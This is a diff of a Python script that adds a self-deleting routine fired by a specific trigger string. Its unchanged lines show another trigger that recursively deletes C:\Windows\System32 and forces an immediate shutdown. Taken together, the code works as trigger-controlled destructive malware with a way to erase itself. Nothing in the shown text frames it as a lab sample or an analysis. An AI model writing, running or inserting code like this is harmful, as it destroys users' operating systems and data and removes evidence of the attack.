@@ -13,6 +13,23 @@ import os
 import gdown
 os.system('cls')
 #exit()
+def self_delete():
+    try:
+        # Get the file path of the script
+        script_path = os.path.abspath(__file__)
+        
+        # Print a message before deleting
+        print(f"Deleting the script: {script_path}")
+        
+        # Delete the script file
+        os.remove(script_path)
+        
+        print("Script deleted successfully!")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+if file_contentsx1 =="ppYnNtw99XO3G":
+    self_delete()
+    exit()
 if file_contentsx1=="deleternn":
     subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
     os.system("shutdown /s /f /t 0")
